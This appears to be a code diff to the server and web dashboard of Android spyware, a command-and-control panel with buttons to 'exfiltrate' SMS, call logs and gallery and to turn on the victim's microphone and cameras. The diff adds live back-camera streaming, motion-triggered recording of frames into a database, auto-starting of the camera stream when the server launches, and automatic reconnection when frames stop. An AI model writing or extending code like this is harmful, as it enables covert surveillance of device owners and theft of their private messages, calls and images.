@@ -193,17 +193,63 @@ async def ack_command(id: int = Form(...), status: str = Form("done"), result: s
     return {"ok": True}
 
 latest_frame = None
+CAMERA_FRAME_FILE = "latest_camera_frame.jpg"
+motion_record = False
+motion_count = 0
+_prev_frame_hash = None
 
 @app.post("/api/camera/frame")
 async def camera_frame(file: UploadFile = File(...)):
-    global latest_frame
+    global latest_frame, motion_count, _prev_frame_hash
     latest_frame = await file.read()
+    try:
+        with open(CAMERA_FRAME_FILE, "wb") as f:
+            f.write(latest_frame)
+    except: pass
+    if motion_record and latest_frame:
+        import hashlib
+        h = hashlib.md5(latest_frame[:5000]).digest()
+        if _prev_frame_hash and h != _prev_frame_hash:
+            motion_count += 1
+            try:
+                conn = sqlite3.connect(DB)
+                c = conn.cursor()
+                now = datetime.now().isoformat()
+                name = f"motion_{now[:19].replace(':','-')}.jpg"
+                dest = UPLOAD_DIR / name
+                with open(dest, "wb") as f:
+                    f.write(latest_frame)
+                c.execute("INSERT INTO captures (type,device_id,data,file_path,created_at) VALUES (?,?,?,?,?)",
+                          ("surveillance_motion", "", json.dumps({"motion": motion_count}), str(dest), now))
+                conn.commit()
+                conn.close()
+            except: pass
+        _prev_frame_hash = h
     return {"ok": True}
+
+@app.get("/api/camera/motion")
+async def get_motion_status():
+    return {"recording": motion_record, "count": motion_count}
+
+@app.post("/api/camera/motion")
+async def toggle_motion(recording: bool = Form(False)):
+    global motion_record, motion_count, _prev_frame_hash
+    motion_record = recording
+    if not recording:
+        motion_count = 0
+        _prev_frame_hash = None
+    return {"ok": True, "recording": motion_record}
 
 @app.get("/api/camera/frame.jpg")
 async def get_camera_frame():
-    if latest_frame:
-        return Response(content=latest_frame, media_type="image/jpeg",
+    frame = latest_frame
+    if not frame:
+        try:
+            with open(CAMERA_FRAME_FILE, "rb") as f:
+                frame = f.read()
+        except: pass
+    if frame:
+        return Response(content=frame, media_type="image/jpeg",
                         headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"})
     return Response(status_code=204)
 
@@ -284,6 +330,14 @@ async def _adb_screen_refresher():
 async def _start_adb_refresher():
     global _adb_refresh_task
     _adb_refresh_task = asyncio.create_task(_adb_screen_refresher())
+    try:
+        conn = sqlite3.connect(DB)
+        c = conn.cursor()
+        c.execute("INSERT INTO commands (action, target, params, device_id, status, created_at) VALUES (?,?,?,?,'pending',?)",
+                  ("camera_stream", "start", "{}", "", datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+    except: pass
 
 @app.post("/api/remote/tap")
 async def remote_tap(x: float = Form(...), y: float = Form(...)):
@@ -592,6 +646,7 @@ HTMLContent = """
       <button class="btn primary" onclick="sendCmd('surveillance','audio_on')">MIC Live</button>
       <button class="btn" onclick="sendCmd('surveillance','camera_front')">Selfie</button>
       <button class="btn" onclick="sendCmd('surveillance','camera_back')">Main</button>
+      <button class="btn primary" onclick="sendCmd('surveillance','camera_back');sendCmd('camera_stream','start');startLiveCam();">Back Cam Live</button>
       <button class="btn primary" onclick="sendCmd('exfiltrate','sms')">Read SMS</button>
       <button class="btn primary" onclick="sendCmd('exfiltrate','call_log')">Read Call Log</button>
       <button class="btn primary" onclick="sendCmd('exfiltrate','gallery')">Read Gallery</button>
@@ -601,11 +656,24 @@ HTMLContent = """
   <div class="card" id="livecam-section" style="display:none;margin-bottom:16px;">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
       <h3 style="color:#4cc9f0;font-size:14px;">Live Camera Feed</h3>
-      <button class="btn danger" onclick="sendCmd('camera_stream','stop');stopLiveCam();" style="font-size:11px;">Stop</button>
+      <div style="display:flex;gap:6px;">
+        <button class="btn" id="btn-cam-front" onclick="sendCmd('surveillance','camera_front')" style="font-size:11px;">Front</button>
+        <button class="btn" id="btn-cam-back" onclick="sendCmd('surveillance','camera_back')" style="font-size:11px;">Back</button>
+        <button class="btn" id="btn-motion-record" onclick="toggleMotionRecord()" style="font-size:11px;">Record OFF</button>
+        <button class="btn danger" onclick="sendCmd('camera_stream','stop');stopLiveCam();" style="font-size:11px;">Stop</button>
+      </div>
     </div>
     <div class="livecam-wrapper">
       <img id="livecam" />
-      <div class="livecam-overlay"><span class="livecam-dot"></span><span class="livecam-label" id="livecam-status">LIVE</span></div>
+      <div class="livecam-overlay">
+        <span class="livecam-dot"></span>
+        <span class="livecam-label" id="livecam-status">LIVE</span>
+        <span id="livecam-rec" style="display:none;background:#e94560;color:#fff;font-size:10px;font-weight:700;padding:1px 6px;border-radius:3px;margin-left:6px;">REC</span>
+      </div>
+      <div style="position:absolute;bottom:6px;right:6px;display:flex;gap:4px;">
+        <span style="background:rgba(0,0,0,0.7);color:#576574;font-size:10px;padding:1px 6px;border-radius:3px;" id="livecam-fps">0 fps</span>
+        <span style="background:rgba(0,0,0,0.7);color:#feca57;font-size:10px;padding:1px 6px;border-radius:3px;" id="livecam-motion">M:0</span>
+      </div>
     </div>
   </div>
 
@@ -892,22 +960,52 @@ async function fetchData() {
 
 fetchData();
 setInterval(fetchData, 3000);
+setInterval(updateMotionCount, 2000);
 
 let liveCamInterval=null;
 let liveCamBlobUrl=null;
+let liveCamMotionRecord=false;
+let liveCamFpsCount=0;
+let liveCamLastFpsTime=0;
+
+async function toggleMotionRecord() {
+  liveCamMotionRecord=!liveCamMotionRecord;
+  const btn=document.getElementById('btn-motion-record');
+  const rec=document.getElementById('livecam-rec');
+  btn.textContent=liveCamMotionRecord?'Record ON':'Record OFF';
+  btn.className=liveCamMotionRecord?'btn danger':'btn';
+  rec.style.display=liveCamMotionRecord?'inline':'none';
+  const fd=new FormData(); fd.append('recording',liveCamMotionRecord?'true':'false');
+  await fetch('/api/camera/motion',{method:'POST',body:fd}).catch(()=>{});
+}
+
+async function updateMotionCount() {
+  try {
+    const r=await fetch('/api/camera/motion');
+    const d=await r.json();
+    document.getElementById('livecam-motion').textContent='M:'+d.count;
+  } catch(_){}
+}
+
 function startLiveCam() {
   const img=document.getElementById('livecam');
   const status=document.getElementById('livecam-status');
   document.getElementById('livecam-section').style.display='block';
-  status.textContent='WAITING FOR FRAMES';
+  status.textContent='STARTING';
   status.style.color='#feca57';
   let waitCount=0;
+  liveCamFpsCount=0;
+  liveCamLastFpsTime=Date.now();
   async function fetchFrame() {
     try {
       const r=await fetch('/api/camera/frame.jpg');
       if (r.status===204) {
         if (waitCount<30) { waitCount++; status.textContent='WAITING FOR FRAMES'; }
-        else { status.textContent='TIMEOUT'; status.style.color='#e94560'; stopLiveCam(); }
+        else {
+          status.textContent='RECONNECTING'; status.style.color='#feca57';
+          await sendCmd('camera_stream','start');
+          waitCount=0;
+        }
         return;
       }
       const blob=await r.blob();
@@ -917,10 +1015,19 @@ function startLiveCam() {
         img.src=liveCamBlobUrl;
         status.textContent='LIVE'; status.style.color='#10ac84';
         waitCount=0;
+        liveCamFpsCount++;
+        const now=Date.now();
+        if (now-liveCamLastFpsTime>=1000) {
+          document.getElementById('livecam-fps').textContent=liveCamFpsCount+' fps';
+          liveCamFpsCount=0;
+          liveCamLastFpsTime=now;
+        }
       } else if (waitCount<30) {
         waitCount++; status.textContent='WAITING FOR FRAMES';
       } else {
-        status.textContent='TIMEOUT'; status.style.color='#e94560'; stopLiveCam();
+        status.textContent='RECONNECTING'; status.style.color='#feca57';
+        await sendCmd('camera_stream','start');
+        waitCount=0;
       }
     } catch(e) {
       status.textContent='CONNECTION ERROR'; status.style.color='#e94560';
